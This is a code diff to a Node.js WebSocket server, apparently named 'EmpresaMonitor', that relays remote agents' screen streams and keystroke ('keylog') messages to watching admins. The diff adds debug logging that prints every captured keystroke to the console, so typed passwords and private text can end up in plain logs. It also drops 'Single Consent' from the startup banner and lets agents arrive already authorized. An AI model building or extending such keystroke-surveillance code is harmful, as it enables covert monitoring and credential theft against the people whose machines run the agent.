@@ -24,9 +24,18 @@ function stopIfUnused(a){ if(a.watchers.size===0) send(a.ws,{type:"stream_stop"}
 
 wss.on("connection", ws => {
   ws.id=crypto.randomUUID(); ws.role="unknown"; ws.selectedAgentId=null;
-  ws.on("message", (data,isBinary)=>{
+  console.log(`[INFO] Nova conexão WebSocket: ${ws.id} (Role: unknown)`);
+
+  ws.on("message", (data, isBinary) => {
+    // LOG DE DEBUG PARA VER O QUE CHEGA
+    const rawMsg = data.toString();
+    console.log(`[DEBUG] Mensagem recebida de ${ws.role}: ${rawMsg.substring(0, 60)}...`);
+
     if(isBinary){
-      if(ws.role!=="agent"||!ws.agentId)return;
+      if(ws.role!=="agent"||!ws.agentId) {
+        console.log("[ERRO] Binário recebido de conexão sem role de agente");
+        return;
+      }
       const a=agents.get(ws.agentId); if(!a||!a.active)return;
       for(const admin of a.watchers){
         if(admin.readyState!==WebSocket.OPEN||admin.selectedAgentId!==a.id)continue;
@@ -36,12 +45,16 @@ wss.on("connection", ws => {
       return;
     }
     
-    let msg; try{msg=JSON.parse(data.toString());}catch{return;}
+    let msg; try{msg=JSON.parse(data.toString());}catch(e){
+      console.log("[ERRO] Falha ao parsear JSON:", e.message);
+      return;
+    }
 
     // --- TRATAMENTO PARA ADMIN ---
     if(msg.type==="admin_hello"){
       if(msg.token!==ADMIN_TOKEN){send(ws,{type:"error",message:"ADMIN_TOKEN inválida"});ws.close();return;}
-      ws.role="admin"; admins.add(ws); send(ws,{type:"admin_ready",agents:[...agents.values()].map(summary)}); return;
+      ws.role="admin"; admins.add(ws); console.log("[INFO] Admin conectado");
+      send(ws,{type:"admin_ready",agents:[...agents.values()].map(summary)}); return;
     }
 
     if(ws.role==="admin"){
@@ -69,11 +82,11 @@ wss.on("connection", ws => {
     if(ws.role==="agent"){
       const a=agents.get(ws.agentId); if(!a)return;
 
-      // NOVO: TRATAMENTO DE KEYLOG (Envia para os admins que estão assistindo o agente)
       if(msg.type === "keylog") {
+          console.log(`[DEBUG] Keylog de agente ${a.id}: ${msg.key}`);
           for(const admin of a.watchers){
               if(admin.readyState === WebSocket.OPEN && admin.selectedAgentId === a.id){
-                  send(admin, msg); // Repassa a mensagem de tecla para o admin
+                  send(admin, msg); 
               }
           }
           return;
@@ -90,8 +103,12 @@ wss.on("connection", ws => {
 
     // --- SETUP INICIAL DO AGENTE ---
     if(msg.type==="agent_hello"){
-      if(msg.key!==AGENT_KEY){send(ws,{type:"error",message:"AGENT_KEY inválida"});ws.close();return;}
+      if(msg.key!==AGENT_KEY){
+        console.log("[ERRO] AgentKey inválida!");
+        send(ws,{type:"error",message:"AGENT_KEY inválida"});ws.close();return;
+      }
       ws.role="agent"; ws.agentId=String(msg.id||crypto.randomUUID());
+      console.log(`[INFO] Agente identificado: ${ws.agentId}`);
       const old=agents.get(ws.agentId); if(old?.ws&&old.ws!==ws) try{old.ws.close();}catch{}
       const preAuthorized = msg.sessionAuthorized === true;
       agents.set(ws.agentId,{ws,id:ws.agentId,name:String(msg.name||"PC"),user:String(msg.user||""),version:String(msg.version||""),active:preAuthorized,controlActive:preAuthorized,watchers:new Set()});
@@ -100,9 +117,10 @@ wss.on("connection", ws => {
   });
 
   ws.on("close",()=>{
+    console.log(`[INFO] Conexão fechada: ${ws.id}`);
     if(ws.role==="admin"){admins.delete(ws);if(ws.selectedAgentId){const a=agents.get(ws.selectedAgentId);if(a){a.watchers.delete(ws);stopIfUnused(a);}}broadcast();return;}
     if(ws.role==="agent"&&ws.agentId){const a=agents.get(ws.agentId);if(a?.ws===ws){agents.delete(ws.agentId);broadcast();}}
   });
 });
 
-server.listen(PORT,"0.0.0.0",()=>console.log(`EmpresaMonitor Realtime V3.1 Single Consent listening on ${PORT}`));
+server.listen(PORT,"0.0.0.0",()=>console.log(`EmpresaMonitor Realtime V3.1 listening on ${PORT}`));
